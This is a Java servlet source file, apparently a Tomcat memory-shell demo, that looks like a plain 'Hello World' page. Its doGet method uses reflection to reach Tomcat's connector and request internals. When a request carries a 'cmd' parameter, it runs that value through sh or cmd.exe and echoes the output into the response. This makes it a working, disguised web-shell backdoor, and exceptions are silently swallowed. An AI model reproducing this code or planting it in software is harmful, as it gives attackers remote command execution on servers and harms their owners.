package org.example.tomcatmemshell;

import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

public class HelloServlet extends HttpServlet {
    private String message;

    public void init() {
        message = "Hello World!";
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/html");
        try {
            //传递的参数，后门标识
            String pass = "cmd";

            //获取WebappClassLoaderBase
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();

            //获取ApplicationContext
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(StandardContext);

            //获取StandardService
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            serviceField.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);

            //获取Connector
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();

            //找到指定的Connector
            for (int i = 0; i < connectors.length; i++) {
                if (connectors[i].getScheme().contains("http")) {
                    //获取protocolHandler、connectionHandler
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
                    getHandlerMethod.setAccessible(true);
                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, null);

                    //获取RequestGroupInfo
                    java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectionHandler);

                    //获取RequestGroupInfo中储存了RequestInfo的processors
                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                    processorsField.setAccessible(true);
                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                    for (int k = 0; k < list.size(); k++) {
                        org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k);
                        if (requestInfo.getCurrentQueryString().contains(pass)) {
                            //获取request
                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                            requestField.setAccessible(true);
                            org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
                            org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                            //执行命令
                            String cmd = request.getParameter(pass);
                            if (cmd != null) {
                                String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                                java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                                java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                                String output = s.hasNext() ? s.next() : "";
                                //回显
                                java.io.Writer writer = request2.getResponse().getWriter();
                                java.lang.reflect.Field usingWriter = request2.getResponse().getClass().getDeclaredField("usingWriter");
                                usingWriter.setAccessible(true);
                                usingWriter.set(request2.getResponse(), Boolean.FALSE);
                                writer.write(output);
                                writer.flush();
                            }
                            break;
                        }
                        break;
                    }
                    break;
                }
            }
        }
        catch (Exception e) {
        }
        // Hello
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<h1>" + message + "</h1>");
        out.println("</body></html>");
    }

    public void destroy() {
    }
}